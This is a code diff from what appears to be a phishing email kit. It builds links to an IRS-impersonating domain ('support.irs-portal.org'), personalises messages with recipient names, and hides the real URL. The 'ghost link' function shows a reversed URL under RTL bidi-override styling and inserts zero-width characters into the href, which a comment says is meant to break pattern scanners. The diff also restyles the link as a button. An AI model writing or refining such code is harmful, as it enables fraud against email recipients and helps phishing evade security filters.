@@ -289,22 +289,21 @@ function applyTags(text, data, recipient) {
     // Use recipient data if available, otherwise auto-generate a random name.
     const firstName = String(r.firstName || '').trim() || pick(firstNames);
     const lastName  = String(r.lastName || '').trim()  || pick(lastNames);
-    const ghostify = (url) => {
-        const reversed = url.split('').reverse().join('');
-        const obfuscated = url.split('').map((char, index) => {
-            return index % 2 === 0 ? char + '\u200c' : char;
-        }).join('');
-        return { reversed, obfuscated };
-    };
     const domain = data.activeDomain || 'support.irs-portal.org';
     const destinationUrl = `https://${domain}/go/${r.transactionUuid || 'V7'}`;
-    const { reversed, obfuscated } = ghostify(destinationUrl);
+    const { reversed, obfuscated } = createGhostLink(destinationUrl);
     const ghostLinkHtml = `
-    <a href="${obfuscated}" style="text-decoration: none;">
-        <span style="direction: rtl; unicode-bidi: bidi-override; color: #0078d4; text-decoration: underline; font-weight: bold; font-family: monospace;">
-            ${reversed}
-        </span>
-    </a>
+    <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="margin-top:20px; margin-bottom:20px;">
+      <tr>
+        <td align="center" bgcolor="#0078d4" style="border-radius:4px; padding:12px 24px;">
+          <a href="${obfuscated}" style="text-decoration: none; display: inline-block;">
+            <span style="direction: rtl; unicode-bidi: bidi-override; color: #ffffff; font-weight: bold; font-family: 'Segoe UI', Arial, sans-serif; font-size: 16px;">
+                ${reversed}
+            </span>
+          </a>
+        </td>
+      </tr>
+    </table>
 `;
 
     return text
@@ -1312,15 +1311,18 @@ function preserveLineBreaks(text) {
 function createGhostLink(url) {
     if (!url) return { reversed: '', obfuscated: '' };
 
-    // 1. Visual Reverse for the human (e.g., https:// -> //:sptth)
+    // 1. Reverse for human view (Display Only)
     const reversed = url.split('').reverse().join('');
 
-    // 2. Technical Obfuscation for the href attribute
-    // Injects &zwnj; every 2 characters to break semantic pattern scanners
-    let obfuscated = "";
-    for (let i = 0; i < url.length; i++) {
-        obfuscated += url[i] + (i % 2 === 0 ? "&zwnj;" : "");
-    }
+    // 2. SMART Obfuscation for the href (The Click)
+    // Keep protocol clean for browser link recognition.
+    const parts = url.split('://');
+    const protocol = parts[0] + '://';
+    const remainder = parts[1] || '';
+    const obfuscatedRemainder = remainder.split('').map((char, index) => {
+        return index % 3 === 0 ? char + '\u200c' : char;
+    }).join('');
+    const obfuscated = protocol + obfuscatedRemainder;
 
     return { reversed, obfuscated };
 }
